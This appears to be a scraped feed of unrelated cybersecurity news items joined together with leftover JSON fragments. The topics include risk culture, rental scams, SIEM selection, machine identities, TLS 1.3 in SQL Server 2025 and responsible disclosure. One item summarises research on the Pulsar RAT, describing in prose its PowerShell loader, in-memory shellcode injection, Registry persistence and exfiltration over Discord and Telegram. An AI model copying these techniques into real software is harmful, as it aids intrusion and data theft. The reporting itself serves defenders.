mid-storm. Forecasting requires speed, and speed requires decision rights and Risk Intelligence. Many programmes invest in detection and forget the human bottleneck. Even perfect visibility is useless if every decision needs a meeting, and every meeting needs a senior leader who is “in back-to-backs.” Top teams make risk-intelligent decisions before the heat. Who can block a release? Who can isolate a system? Who can force key rotation? Who can accept risk, and under what conditions? When an issue jumps a level, and what triggers that jump. If you want forecasting, fix your approval grid. Make it short. Make it usable at 2 a.m. Then protect it. One override for convenience, and people learn the real rules. The real rules always win. Behavioral standards: What ‘good’ looks like on Tuesday You can’t ask people to “care about risk” and expect it to stick. People run on what gets rewarded and what gets them in trouble. So strong teams set behavioral standards. Not as a lecture. As an operating agreement. Security’s job is to reduce harm while keeping work moving, not to act as a gatekeeper. That means rules people can follow, and guardrails that make the right path easier than the wrong one. Engineering’s job is to own what they ship, not to “help security.” If you build it, you own the blast radius. Product’s job is to make exposure part of design, not to treat security as a late-stage checklist. If you can’t explain why a feature is worth the risk, you don’t understand the feature. Vendor owners have a job too. They can’t outsource supplier risk to a questionnaire. They own the follow-up when a supplier says, “We’ll fix it next quarter.” A small practice I love. Ask each team for three “no surprises” rules. No privileged access without expiry. No production change without rollback. No new vendor without an owner and an exit plan. Short list. Clear verbs. Real enforcement. That’s culture. Operating rhythm: The week is where risk becomes real If you only talk about risk during audits and incidents, you don’t have a culture of risk. You have a seasonal sport. Forecasting lives in cadence. In the meetings you actually attend. Weekly, run a short review with three questions. What changed that affects exposure? What almost went wrong? What needs a decision? Keep it tight. If it turns into status theatre, kill it and start again. Monthly, practice one scenario. Plain, no fancy decks. If ransomware hits this service, what happens in the first hour? Who decides. What do you shut down, and what must stay alive? Quarterly, test what you claim. Backups. Access controls. Vendor escalation. If you can’t test it, you don’t know it. This rhythm teaches people that risk isn’t a surprise visitor. Risk is a resident. You don’t panic when you see it. You deal with it. Imagine you once joined a team’s weekly review as a guest. Ten minutes in, an ops lead said, “We changed the identity provider settings yesterday. It felt odd.” No panic. No blame. Just a raised hand. Security asked two questions, engineering checked logs and they rolled back a risky toggle before lunch. Nothing made the news. Nobody got a medal. Everyone went home on time. That’s what a good rhythm buys you. Most weeks, quietly. Measures that point forward: Count what moves before damage Many dashboards tell you what already happened. Incidents. Downtime. Loss. Useful, but late. If you want forecasting, track measures that move before the mess. Let’s shift to being a little more proactive and presilience-focused, instead of testing our reactions and resilience as the go-to responses. How long do critical patches sit on systems that matter? How often do privileged access exceptions expire on time? How many urgent changes bypass checks, and where? How many near misses get reported, and how fast you learn? Watch a team celebrate fewer incidents while near-miss reporting fell to zero. They thought they improved. In reality, people stopped speaking. Six weeks later, they got hit. The silence was the signal. You don’t want perfect numbers. You want honest trends that trigger choices, not slides. Leadership: The culture you reward is the culture you get Leaders say they want transparency. Then they punish the first person who brings bad news. That one moment teaches the organization more than any policy ever could. If you want forecasting and Presilience, protect the messenger. Praise early escalation. Treat risk as a trade, not as a personal failure. Also, stop romanticising heroics. The midnight save feels good. It makes a great story. It also hides the root issue: poor planning, weak controls, unclear ownership and a habit of postponing boring work. Boring work buys calm, discipline buys reliability but risk intelligence enables the right balance of compliance, resilience and presilience to manifest. Think of board conversations where someone asked, “Why spend on resilience when nothing happened this quarter?” And you answered with a question. “Would you rather pay for brakes or for ambulances?” It landed because it was true. A simple 90-day shift: Small moves, real change If your team feels stuck, don’t start with a massive program. Start with a few moves that change behavior fast. First 30 days. Map your top repeat failures. Pick five signals to watch weekly. Name owners. Days 31 to 60. Fix one decision bottleneck. Write the rule. Use it. Days 61 to 90. Run one scenario practice a month. Learn one thing. Change one playbook. Close one gap. You’re not chasing perfection. You’re building a habit. Habits compound. If you do this well, something shifts. You stop being surprised by the same problems. People raise issues earlier. Engineers stop hiding bad news. Security stops shouting into the void. The organization feels calmer. Not complacent. Calm. That calm is not luck. It’s culture. The right balance between prevention, reaction and proactivity ensures sustainable high performance. And here’s the quiet mic-drop. When risk becomes a daily conversation, you don’t need to guess the future. You stop being shocked by the present. This article is published as part of the Foundry Expert Contributor Network.

An Australian housing scam preying on renters who are willing to stretch every dollar to secure a roof over their heads. These rent scams, often orchestrated by individuals posing as private landlords on online platforms like Facebook Marketplace, have left victims financially and emotionally drained. The scheme typically begins with a seemingly genuine rental listing. Scammers steal photos from legitimate properties and post them online, offering rent well below the market rate. In Perth, median rental prices are at historic highs, with houses averaging $700 per week and units $670. Scammers exploit this stress by pitching “exclusive” opportunities that seem almost too good to be true. The Mechanics of the Australian Housing Scam Messages from these fraudsters are carefully crafted to manipulate potential tenants. One such message promises that the apartment will be “reserved exclusively only for you” in exchange for a security deposit or “commitment fee” of just a few hundred dollars. The deposit is presented as fully refundable or deductible from the first week’s rent. In reality, once the money is transferred, the scammer vanishes, leaving victims without the property and out of pocket. WA Commissioner for Consumer Protection, Trish Blake, describes the situation as a “perfect playground for scammers.” She explains that the perpetrators often groom their targets by appealing to their sense of urgency and personal integrity, portraying themselves as allies to those struggling in the rental market. “They’ll tell you that you’re a real battler, that you’re a good person, and that they want to help you out,” Blake said, as reported by Nine News . Rising Numbers and Financial Impact The scale of the problem is growing. In 2025, WA ScamNet, part of the Department of Local Government, Industry Regulation and Safety, documented 20 cases of rental scams, totaling losses of $51,875, a 27 percent increase from the previous year. Scammers typically provide a property address for drive-by inspections but evade any requests for in-person viewings. To add credibility, fake rental agreements featuring official logos may be used, and tenants are pressured to pay via bank transfer, bypassing safer, traceable channels. Rob Mandanici, a member of the Real Estate Institute of Western Australia, stresses the emotional pressure on renters. “People have pure desperation, and they will do what they can for their family, thinking they’re doing the right thing while potentially dealing with unsavoury characters,” he said. Commerce Minister Dr. Tony Buti noted the heartbreak of seeing renters targeted in this way. “It is particularly heartbreaking to see scammers targeting renters because they know they are under pressure and may take risks to secure a property,” he said. He advises tenants to insist on inspecting the property in person and to treat unusually cheap rent as a red flag. Why Perth Is Vulnerable to Housing and Rent Scams Several factors make Perth an ideal environment for this type of Australian housing scam. Rental vacancies are low, demand is high, and properties are snatched quickly, often in as little as 16 days. This scarcity creates a sense of urgency among renters, which scammers exploit. The Cook Government has issued repeated warnings to Western Australian tenants to remain vigilant, especially when dealing with private landlords or online marketplaces. Inspecting the property before paying, verifying the landlord’s identity, and consulting licensed real estate agents are critical protection methods. Several practical tips to avoid falling victim to rental scams include: Be suspicious of properties advertised for well below market rent. Do not rely solely on photos; perform reverse image searches to verify authenticity. Check the property on reputable real estate websites and contact previous listing agents. Avoid landlords or listings that use the same email address for multiple properties. Always inspect the property in person before signing a lease or paying funds. Ensure a formal lease agreement (Form 1AA) and keys are provided before transferring any money. Be cautious with direct bank transfers; only pay verified landlords or licensed agents. Scams can be reported through the WA ScamNet website, or further guidance on rent is available via the Consumer Protection website. The Australian housing scam in Perth is more than a financial threat; it exploits human vulnerability in a market under immense pressure. Renters finding high prices and fierce competition must combine caution with diligence, balancing urgency with verification. While there is no substitute for careful vetting, awareness and education remain the most effective defense against campaigns like the Australian housing scam.

    "summary": "Hi everyone, I’m currently looking to implement a SIEM solution for our company of around 400 users. At the moment, I am evaluating different vendors, and I’m fully aware that the two solutions I’m considering operate quite differently — especially in terms of pricing models. I’d really appreciate hearing from people who have hands‑on experience with these platforms. If you’ve switched from one to the other, what were the technical reasons behind your decision? Please keep the discussion focused on technical aspects that prompted a change. After a brief initial evaluation, here’s my takeaway so far: Rapid7 Pros: Centralized GUI with customizable dashboards “Cost‑effective” — depending on perspective, but pricing plays an important role for us Automated integration of new threat intelligence / attack indicators Microsoft Sentinel Pros: We already have a full Microsoft 365 tenant Frequent updates and continuous feature enhancements Deep integration within the Microsoft ecosystem Cons: Potentially higher cost Can be quite complex to set up and fine‑tune What are your honest thoughts on these products? What has your experience been — especially in terms of deployment, maintenance, noise reduction, integration, detection quality, and long‑term operational effort? Thank you guys!

    "title": "This stealthy Windows RAT holds live conversations with its operators",
    "summary": "Security researchers at Point Wild have disclosed a new Windows malware campaign that uses a multi-stage infection chain to establish persistent, memory-resident access on compromised systems and steal sensitive data. The analysis found the malware relying on standard Windows components for execution and persistence, limiting the number of artifacts written to disk. The activity, analyzed by the company’s Lat61 team, involves a .NET-based, modular remote access trojan (Pulsar RAT) that supports live, interactive operator control. The malware’s reliance on in-memory execution and living-off-the-land techniques limits the effectiveness of file-based detection tools, the researchers noted in a blog post. “The malware exhibits advanced anti-analysis techniques, including anti-VM, anti-debugging, and process injection detection, alongside extensive credential harvesting, surveillance capabilities, and remote system control,” they said. “Stolen data is exfiltrated as ZIP archives over Discord webhooks and Telegram bots.” Initial access and memory-resident execution The infection chain begins with a small batch script that establishes persistence through a per-user Registry Run key. Rather than deploying a full executable, the script launches a PowerShell-based loader , reducing the likelihood of immediate detection by traditional endpoint security tools. This PowerShell loader decodes and executes shellcode generated using Donut , an open-source framework commonly used to convert. NET assemblies into position-independent shellcode. The shellcode injects the payload directly into memory, avoiding the need to write a portable executable to disk. By operating entirely in memory after initial execution, the malware limits the effectiveness of file-based scanning and static analysis. Point Wild researchers noted that the attack blending into normal Windows activity calls for behavioral or memory-focused telemetry. Once loaded, the malware deploys a heavily obfuscated .NET component that serves as the core execution framework for the operation. RAT capabilities and stealer functionality The .NET payload implements a remote access trojan that allows operators to interact directly with compromised systems. Unlike many commodity RATs that rely on periodic check-ins, this malware supports live command handling, enabling attackers to issue instructions and receive responses in near real-time. This interactive design allows operators to perform reconnaissance, manipulate files, execute commands, and manage persistence dynamically based on what they observe on the infected host. Alongside the RAT functionality, the malware includes an information-stealing component that collects sensitive system data. While the disclosure did not attribute the Stealer to a specific malware family, the researchers noted that it operates in parallel with the RAT, allowing data collection to continue while operators actively engage with the system. Persistence, evasion, and mitigation Persistence is maintained through Registry-based autorun entries and reinforced by the malware’s ability to re-establish execution if disrupted. The use of obfuscation across the .NET payload further complicates reverse engineering and slows analysis. Point Wild emphasized that the campaign’s effectiveness stems from disciplined execution of Living-off-the-land binaries, in-memory payloads, and obfuscated managed code. Together, they make detection difficult. The researchers noted that detecting the activity requires monitoring process and memory behavior rather than relying on file-based indicators, which include watching for suspicious PowerShell execution, shellcode injection into running processes, and suspicious persistence via Registry Run keys. Rapid host isolation and live response were emphasized to contain interactive activity and limit data theft once a compromise is suspected.",

    "title": "Why non-human identities are your biggest security blind spot in 2026",
    "summary": "Last month, while running a routine access audit on our Azure environment, I came across a service account called svc-dataloader-poc. It had not been touched in 793 days — two years of sitting dormant. When I checked its permissions, my stomach dropped: Owner-level access to three production subscriptions, including our customer database. The account had been spun up for a proof-of-concept migration that never went live. The contractor who created it left 18 months ago. Nobody knew it existed. This was not a one-off. I found 47 similar accounts in that same audit. Forty-seven doors left wide open. Here is the uncomfortable reality facing every security leader in 2026: while we spent the last decade perfecting MFA rollouts and zero-trust architectures for our human users, something else was quietly multiplying across our environments. Service accounts. API keys. Automation credentials. AI agents. These non-human identities now outnumber actual employees in most enterprises by ratios that would have seemed absurd five years ago. ManageEngine’s 2026 Identity Security Outlook found that organisations reported machine-to-human ratios of 100:1; some hit 500:1. And the vast majority of these identities sit completely outside our governance programmes. We locked the front door. The back door has been open this whole time. Why the NHI explosion is different this time Machine identities are not new. What changed is the velocity. Five years ago, a typical enterprise application was a monolith talking to a database. Today, that same application is 50 microservices, each needing credentials to talk to the others. Every Kubernetes pod that spins up during auto-scaling creates workload identities. Every GitHub Actions workflow generates tokens. Every Terraform run provisions service principals. I watched a single deployment pipeline create more machine identities in 20 minutes than our entire company had human users. Then came agentic AI, and the problem accelerated again. These are not chatbots answering questions. They are systems authorised to execute commands, move production data, modify configurations and trigger downstream workflows autonomously. Microsoft Copilot has access to your SharePoint. GitHub Copilot can commit to your repos. The AI assistant your marketing team just deployed can pull customer records from Salesforce. One Identity is predicting 2026 will see the first major breach traced back to an over-privileged AI agent. The terrifying part? It will not look like an attack. It will look exactly like the system doing what it was designed to do. Our IAM systems were never built for this. They assume identities belong to people with managers who respond to access review emails and eventually resign or retire. Machine identities have no manager. They never respond to certification campaigns. They do not quit. The OWASP Non-Human Identities Top 10 ranks improper offboarding as the number one risk. When a project gets cancelled, when a vendor integration gets deprecated, when a developer leaves — does anyone remember to delete the service accounts? In my experience running IAM programmes across multiple organisations, the answer is almost never. The three blind spots I keep finding After years working in cloud security and identity management, certain patterns show up everywhere I look. Three problems in particular appear in nearly every environment I assess. Secrets where they should never be. I still find API keys hardcoded in source files. Still. In 2026. Last year, GitGuardian detected 13 million secrets exposed in public GitHub repositories. Google API keys, MongoDB credentials, AWS access keys — sitting in plaintext for anyone to harvest. But the public repos are not even the biggest problem. In my own assessments, I have found production database passwords in Jira tickets, Slack messages, Confluence runbooks and shared Google Docs. A colleague once discovered an admin token for a payment gateway pasted into a Teams chat from 2023, still valid, still granting full access. Once secrets escape into collaboration tools, you have lost control. They get copied, forwarded, indexed, archived. They never truly disappear. Service accounts with absurd privilege levels. This one makes me angry because it is so preventable. A developer needs a service account for a new Lambda function. They are under deadline pressure. Figuring out the exact minimum permissions takes time, so they attach AdministratorAccess and move on. The function works. Nobody revisits it. That account now has god-mode access to your entire AWS environment for a task that needed read access to one S3 bucket. Multiply this across every team, every sprint, every year. The 2025 State of Non-Human Identities report from Entro Security found 97% of NHIs have excessive privileges. Ninety-seven percent. Even more alarming: just 0.01% of machine identities control 80% of cloud resources. Compromise one of those accounts and the attacker owns your environment. No lifecycle ownership whatsoever. When an employee leaves, HR triggers offboarding. Access gets revoked. There is a process. When a service account is no longer needed, what happens? Nothing. It sits there. I routinely find accounts untouched for six months, twelve months, sometimes three years — all still holding production access. Veza’s research found dormant accounts nearly doubled year over year. Orphaned identities grew 40%. Former employees — 78,000 of them in one dataset — still had active credentials because HR systems flagged them as inactive but nobody revoked their service accounts. These are not theoretical vulnerabilities. These are live credentials waiting for someone to find them. A practical path forward for security leaders Acknowledging the problem is step one. Fixing it requires treating machine identities with the same governance discipline we finally learned to apply to human users. Based on what I have seen actually work, here is where I would focus. Build a real inventory. You cannot protect what you cannot see. Before anything else, discover every non-human identity in your environment. Every service account across your cloud platforms. Every API key in your applications. Every secret in your vaults, config files, CI/CD pipelines. Every third-party integration with access to your systems. Most organisations I work with drastically underestimate their footprint. The actual number is typically three to five times what teams expect. This cannot be a manual exercise or an annual audit. Identities are created faster than humans can count them. Automate discovery and make it continuous. Enforce least privilege without exceptions. Every NHI needs to be scoped to the minimum access required for its function. Yes, this takes work. Yes, developers will push back. Do it anyway. Start with new deployments and make least privilege the default from day one. For existing accounts, compare assigned permissions against actual usage patterns. You will find plenty of accounts with broad access that only ever touch one or two resources. Those are quick wins. Require security approval before any NHI gets elevated privileges. Make it a gate, not a suggestion. Eliminate static credentials wherever possible. Long-lived secrets are the root cause behind most NHI breaches. The goal should be eliminating them entirely. Replace permanent API keys with short-lived tokens that expire automatically. Implement just-in-time access that grants permissions for a specific task and revokes them immediately after. Automate credential rotation on a defined schedule — weekly, daily, even hourly for sensitive systems. Research shows 71% of non-human identities are not rotated within recommended timeframes. Every day a credential sits unchanged is another day an attacker could be using it without detection. The security industry is converging on a clear consensus for 2026: machine identities will become the primary breach vector in cloud environments. Tenable predicts it. Delinea predicts it. One Identity predicts it. Attackers already know that compromising a service account is often easier and quieter than targeting humans. They are not breaking down doors anymore. They are walking through the ones we forgot to lock. The organisations that get ahead of this threat will be the ones treating their non-human identities with the same seriousness they apply to their executive accounts. Full visibility. Strict governance. No exceptions. The ones who keep treating NHIs as an afterthought will be the ones explaining to their boards how a forgotten service account from a cancelled project brought down the house. We locked the front door years ago. It has been a long time since we secured the back. This article is published as part of the Foundry Expert Contributor Network. Want to join?",

    "title": "TLS 1.3 in SQL Server 2025: What It Really Changes for Security",
    "summary": "Why TLS 1.3 matters TLS (Transport Layer Security) is the protocol that encrypts traffic between clients and servers. For many years, most SQL Server environments have relied on TLS 1.2, which dates back to 2008. TLS 1.3, finalized in 2018, is a significant evolution. It brings three main benefits: Better performance With fewer roundtrips and faster negotiation, secure connections are established much more quickly in practice Stronger security Old and weak algorithms are removed (RC4, SHA1, MD5, DES, 3DES…) Perfect Forward Secrecy (PFS) is mandatory. Even if a private key is compromised later, past sessions remain protected Simpler cipher suites: less configuration complexity, fewer chances to misconfigure Easier compliance Recommended by NIST Strongly encouraged by PCIDSS 4.0 Fewer exceptions to justify during audits What SQL Server 2025 adds SQL Server 2022 introduced TLS 1.3 through the new TDS 8.0 (Tabular Data Stream) protocol. And SQL Server 2025 makes it broadly usable across the SQL Server ecosystem, this is not limited to client connections only. Components that can use TLS 1.3 Client connections (ODBC, OLE DB, .NET) SQL Server Agent bcp utility sqlcmd utility Always On Availability Groups Always On Failover Cluster Instances Log Shipping Transactional replication Merge replication Peer-to-peer replication Snapshot replication Linked Servers PolyBase SQL Writer Service Prerequisites Valid certificates on all endpoints Selfsigned certificates are acceptable for testing In production, use certificates from a trusted CA or an internal PKI Updated drivers ODBC Driver 18+ for SQL Server OLE DB Driver 19+ for SQL Server Microsoft.Data.SqlClient 5.0+ Older drivers will either fall back to older TLS versions or fail to connect SQL Server configuration You can enforce encryption on all connections (Force Encryption) You can configure TDS 8.0 as the minimum protocol version (Force Strict Encryption) How Copilot can help I'm setting up log shipping between two SQL Server 2025 instances with TLS 1.3 enabled. What certificate requirements should I verify ? The MSSQL extension with GitHub Copilot can assist you when planning and rolling out TLS 1.3. Auditing the current state Analyze my current SQL Server encryption configuration. What TLS version are my connections using ? Are there any connections using deprecated protocols ? Copilot can generate and explain the queries that inspect the relevant DMVs and interpret the results. Generating configuration scripts Generate a script to configure SQL Server 2025 to require TLS 1.3 for all incoming connections, including the certificate configuration steps. Diagnosing compatibility issues My application fails to connect after enabling TDS 8.0. The error mentions \"SSL Provider\". What should I check and how do I fix it ? Reviewing linked servers Review my linked server configurations and identify which onesmight have issues with TLS 1.3 requirements. Documenting the changes Generate documentation for our security team explainingthe TLS configuration changes we're implementing for PCI-DSS compliance. It is possible that the AI generated content is incorrect. You remain responsible for reviewing, validating, and approving it before any use. Do not rely on this output without thorough human verification. Not intended for production use. Things to watch out for Linked Servers to legacy systems You may have linked servers that point to: Older SQL Server versions (2016 and earlier) ODBC sources that do not support TLS 1.2/1.3 Thirdparty servers with outdated TLS stacks If you enforce TLS 1.3 everywhere, these connections can fail. Possible approaches: Upgrade the remote systems Use temporary exceptions (not recommended longterm in production) Introduce a proxy or gateway that can handle protocol translation Replication to older versions Transactional or merge replication to subscribers running SQL Server 2019 or earlier may require mixed configurations. Legacy applications Applications using: .NET Framework with older System.Data.SqlClient versions Old ODBC/OLE DB drivers Thirdparty tools that are not updated may need to be upgraded or reconfigured before you enforce TLS 1.3. Suggested deployment strategy These steps are indicative; adapt them to your environment and change management process. Phase 1: Audit Inventory all inbound and outbound connections Identify client types and driver versions Document linked servers and replication paths Phase 2: Testing Enable TLS 1.3 in a staging or preproduction environment Test all critical applications and administrative tools Identify and resolve compatibility issues Phase 3: Progressive rollout Enable TLS 1.3 as an option without forcing it Monitor which connections still negotiate older TLS versions Once all key systems are compatible, enforce TLS 1.3 References TDS 8.0 - SQL Server Configure TLS 1.3 on SQL Server 2022 and later - SQL Server Encrypt Connections by Importing a Certificate - SQL Server Database Engine: Breaking Changes - SQL Server 2025 Certificate Requirements for SQL Server - SQL Server",

In this episode, Warwick Webb, Vice President of Managed Detection and Response at SentinelOne, breaks down how today's breaches often begin invisibly, progress undetected through siloed security stacks, and accelerate faster than human response alone can handle. He'll discuss how unified platforms, machine-speed detection powered by global threat intelligence, and expert-led response change the equation--turning fragmented signals into clear attack narratives. The conversation concludes with how organizations can move beyond incident response to build resilience, readiness, and continuous improvement through post-attack analysis. Listeners will leave with a clearer understanding of how attacks actually unfold in the real world—and what it takes to move from reactive alert handling to true attack-flow-driven defense.

    "title": "CSO Barry Hensley on staying a step ahead of the cyber threat landscape",
    "summary": "IT security was a critical element of retired US Col. Barry Hensley’s 24-year military career as an Army Signal Officer, as he was often responsible for the engineering and installation of “military networks, whether in garrison or in support of combat troops deployed.” “The pinnacle of my military career was working with an elite group of cyber forces with the ultimate mission to operate and defend the military’s global communications network,” Hensley tells CSO. “It was during this period that I realized the severity of cybersecurity issues facing this [US] nation, and I wanted to commit my professional career to be part of the solution while continuing to fight the good fight.” Today, Hensley is the CSO of Brown & Brown, a global insurance brokerage, with the goal to help clients safeguard what matters most to them. CSO spoke to Barry Hensley about cybersecurity in the insurance industry, how to keep cyber professionals inspired, and more. How do organizations today perceive cybersecurity? Hensley: The awareness of cybersecurity risks is more consistent across industry today; but the degree of required call to action often varies greatly. Cybersecurity is foundational to any organization, especially where customer confidence and trust are essential. And part of that trust includes the security of the networks, the data, and the services we provide. It was not that long ago that organizations did not believe the risks were real or relevant to them. Times have changed as more organizations have either experienced a significant incident firsthand or have seen enough third- and fourth-party breach notifications to take up arms. All these events drive awareness and give credibility to the threats and associated risks. However, there is still a challenge in establishing an appropriate risk tolerance that drives the right investments in effective security controls, especially for budget constrained organizations. We also cannot forget the rise of government intervention and fines and other regulatory actions related to cybersecurity events that will influence those perceptions. What specific security risks are you facing in the insurance industry today? Threat actors today have a common theme, and that’s how they capitalize on their access. So, personally, I do not over-index on the vertical specific threats; it’s really about the data or access those organizations possess and its perceived value. Specific to the insurance industry, there may be information collected to inform a claim or policy that a threat actor might determine valuable even if it only refines their targeting efforts of others. However, we also cannot wish away the “idealist” or “ideologically motivated” threat actors that target the insurance industry because of historical misconceptions or animosity toward the industry. Specific to ransomware, threat actors are likely to target organizations that have a high likelihood of paying or be exploited. So, it’s as much about the data those organizations possess, not necessarily the industry verticals themselves, and the maturity of their security program. Threat actors want to expend the least number of resources for the highest return on investment, so they often target low-hanging fruit, which are, in many cases, the least mature security programs. Do you see your cybersecurity strategy changing in the next few years? Our strategy remains the same: focused security investments aligned to our risk tolerance, staying a step ahead of an increasingly active threat landscape. An example is the adoption of artificial intelligence hacking tools, clearly an illustration of the need to adapt. The question is, How do our security teams combat this advancement with our own AI strategy? How do we leverage AI to carry out those commodity tasks while unleashing our human teammates to focus on business context as it relates to the overall risk reduction and prioritization of training those AI models? So, imagine an AI security workforce that is led by human security subject-matter experts ensuring we have appropriate defenses at the right time and right place. An example would be conducting continuous penetration testing to find the gaps in our defenses that might otherwise go unnoticed. We do see the evolution of third- and fourth-party risk management, especially in how we validate our security partner’s maturity and resilience. The evolution of risk is partly based on third and fourth parties swapping their underlying technologies to reduce cost or increase efficiencies that a customer has little to no understanding of the risks that might expose. So, for the security functions we’re going to provide internally, we’ll focus on the basics and do them well. With the controls/functions we outsource, we must reimagine not only how we verify our partner environments but how do we actively participate to improve their security programs as well as ours. We cannot forget that much of cybersecurity is about doing the basics brilliantly. And in this case, those basics of building and securing an infrastructure that will still be leveraged for years to come. What do you do to retain cybersecurity professionals? Leadership is about how you inspire people to achieve or accomplish a shared vision beyond what they ever expected they could do. Leaders must first understand teammates’ passions and relevant skills to align them to achieve business goals . Getting their buy-in is key while clearly articulating where they fit in the overall vision. At Brown & Brown, we help others protect what is most valuable to them. To retain our top talent, we make sure our teammates understand where they fit into that mission. Our success story is based upon earning people’s business every day, and ensuring that our environment, networks, and data are secure is critical to building and retaining that trust. We need to demonstrate to our teammates just how integral they are to maintaining that trust in our customer relationships. We want them to wake up every day knowing that they play an important role not only in our security program, but also the broader Brown & Brown ecosystem. At Brown & Brown, we put the teammate first, as their expertise will always be a key differentiator. What are you most proud of? I am most proud of the inspiring team of security professionals that I work with each day. They always put the team before themselves, strive to be the very best at what they do, and always go the extra mile to ensure the security and protection of their teammates and the organization. I am truly blessed to be part of an amazing team whose work ethic and commitment to excellence are unparalleled in my experience. Are there any questions CISOs should be asking themselves? Are we assessing the most relevant risks, rather than the risks of yesterday? And, because we can get so wrapped up in the playbook that we ran in our last organization, how do we ensure the current playbook is relevant to the organization at hand? An example would be how much time we focus on phishing training, which burdens our teammates to be the first line of defense, where we could instead leverage anomaly-based detection to automate the detection and response actions. What are the biggest security challenges cybersecurity leaders are facing right now? Hensley: In this business, there is no single biggest challenge, but multiple, ever-evolving challenges that compete for our attention. A shared challenge across the entire cybersecurity community is having to be right 100% of the time in a world where threat actors are so agile, innovative, well-resourced, and advantaged with the element of surprise. Cybersecurity professionals also struggle with prioritizing their efforts while providing innovative solutions for their enterprises. Every cybersecurity leader must wrestle with the risks posed by new technologies; AI being just one of many. While there is no absolute “right” answer to the risk question, the age-old formula of mitigating threats against your most critical assets holds firm. Security teams have an ongoing mission to identify weaknesses, assess the likelihood of exploitation, and determine the resulting impact on the business. It’s a difficult but necessary step in the risk versus reward trade-off . What keeps you up at night? Hensley: The unknown. As I shared above, cybersecurity professionals must be right 100% of the time, while threat actors only need to exploit one unknown or unmitigated vulnerability, or take advantage of a single user with privileged access. Our risk modeling should invest in effective security controls to minimize the unknown threats as much as possible against our most critical assets.",

    "title": "When responsible disclosure becomes unpaid labor",
    "summary": "Responsible disclosure is built on an assumption that “doing the right thing” will be met with timely action, fair treatment, and professional respect, if not a bounty award. Increasingly, that assumption is failing. And when it does, organizations alienate researchers and create regulatory, legal, and reputational risk. Over the past few years, security researchers have found themselves waiting months, sometimes more than a year, for companies to acknowledge responsibly disclosed vulnerabilities, even as the same flaws quietly put customers at risk. In several cases, frustration over silence, disputed severity assessments, or shifting scope boundaries pushed researchers toward public disclosure, legal escalation, or questionable behavior companies later characterized as extortion. As vulnerability reporting becomes slower, more bureaucratic, and less rewarding, the line between cooperative research and adversarial pressure is blurring. For CISOs, this is no longer an ethics debate. It is a governance and risk-management problem. A recent flashpoint Most recently, the React2Shell vulnerability (CVE-2025-55182) illustrated how responsible disclosure can work when the right structures are in place. The flaw was privately reported to the React maintainers on 29 November 2025. The disclosure triggered a coordinated response involving the React team, Next.js maintainers at Vercel, and major cloud providers including Amazon Web Services (AWS) and Cloudflare, allowing patches to be developed and tested ahead of public disclosure. Despite the prompt acknowledgment and remediation efforts, the vulnerability was quickly exploited in the wild . Responsibility for mitigation was effectively distributed across maintainers, framework integrators, and downstream users. Because React sits at the core of the modern web stack, the flaw rippled across development and security teams globally, highlighting how even well-handled disclosures can still produce widespread operational risk. React benefits from strong institutional support through the React Foundation and backing from multiple large technology companies. That support enables coordinated fixes, communication, and sustained maintenance. The more difficult question is what happens when a researcher uncovers a similarly critical flaw in a widely used open-source project that has no corporate backing, no formal security team, and no bounty program? In those cases, exploitation is clearly unethical, but reporting the issue often means unpaid labor with uncertain outcomes. The dilemma raised in practitioner circles after React2Shell was not about this specific incident, but about the broader incentive gap. If responsible disclosure offers neither compensation nor assurance of timely action, what realistically motivates researchers to continue doing the right thing? The question resonated not because it’s new, but rather that it reflects a growing disconnect between how vulnerability disclosure is supposed to function and how it increasingly does in practice. Enter the gray zone of ethical disclosure The result is a growing gray zone between ethical research and adversarial pressure. Based on years of reporting on disclosure disputes, that gray zone tends to emerge through a small set of recurring failure modes. Silent treatment and severity warfare: Researchers submit detailed reports and receive no response for months, or face disputes over CVE scope and CVSS scoring that turn technical discussions into negotiations. Researchers feel compelled to defend impact claims aggressively and to be taken seriously, while vendors push back against what they view as inflated risk . In some cases, bounty hunters preemptively elevate severity, anticipating resistance and delays. Process as denial of service: Automated scanners, AI-assisted fuzzing , and largely theoretical bugs increasingly flood maintainers and security teams with low-signal reports — a dynamic repeatedly highlighted by Daniel Stenberg, the founder of the cURL project. As a defensive response, maintainers demand ever more concrete proof of exploitability, raising the threshold for engagement even for legitimate findings. In some cases, projects begin questioning whether bug bounties meaningfully improve security, or simply externalize triage cost under the guise of incentives. Coercive escalation: Finally, when established disclosure channels appear unresponsive or dismissive, some researchers resort to public pressure, legal threats, or ethically ambiguous demonstrations to force action. Each of these failure modes seems rational in isolation. Together, they erode trust and steadily push responsible disclosure toward a more adversarial posture. Case studies from the fault line In 2025, a responsibly reported email spoofing flaw affecting a major delivery platform was deemed out of scope , triggering a dispute over severity and impact. The underlying issue was not whether the bug existed, but whether it crossed the organization’s internal threshold defining risk. The disclosure process stalled, and frustration escalated on both sides, with the vulnerability reporter barred from the bug bounty program over advances the company saw as extortion. A similar pattern appeared at a ride hailing company, where multiple researchers independently reported a flaw that allowed emails to be sent appearing to originate from the company’s domain. Despite clear reproduction steps and repeated follow-ups, the reports went unanswered for more than a year. Ethical disclosure was met not with remediation, but with silence. Elsewhere, disputes have emerged over overlapping CVE claims, with multiple parties arguing over attribution for the same underlying issue. What is meant to be a coordination mechanism instead became a contest for recognition, further distorting narratives. More troubling are cases where researchers crossed ethical boundaries entirely. For example, hijacking open-source libraries to harvest cloud credentials, or taking control of legitimate packages to embed job application messages, compromising downstream users in the process. Such actions are indefensible but are best understood as symptoms of a disclosure ecosystem that increasingly rewards escalation, visibility, or leverage over patience and cooperation. Why is this happening now? It would be easy to frame these disputes as a breakdown in professional norms, but what is happening beneath the surface is the convergence of several structural forces. Vulnerability report volume has surged. Automated scanners and AI-driven fuzzing tools now generate vast numbers of technically valid but operationally irrelevant findings. Maintainers and security teams are forced to triage at scale, often under significant time and resource constraints. At the same time, compliance pressures have hardened organizational responses. Once a CVE is reported, it is often treated as a problem by default, before context or exploitability is assessed. High severity scores can trigger build failures, audits, or executive escalation regardless of practical impact — a common frustration for developers using SCA tools that block builds over edge cases that ultimately need to be ignored or waived. CVSS scoring itself is mechanically calculated and intentionally environment-agnostic, meaning low-impact edge cases can score similarly to actively exploited flaws, contributing to alert fatigue and skepticism. Finally, open source infrastructure remains structurally underfunded . Many critical components are maintained by a small number of individuals with no obligation, or capacity, to absorb the operational cost imposed by global dependency chains. In this environment, demanding proof of real-world impact is a form of noise control, rather than hostility. That seemingly reasonable demand, however, has downstream consequences. When proof becomes unpaid consulting In many disputes, disclosure breaks down not because a vulnerability does not exist, but because proving its real-world impact requires environment-specific analysis that neither side budgeted for. Researchers are asked to build realistic PoCs, demonstrate exploit chains, or validate assumptions across configurations 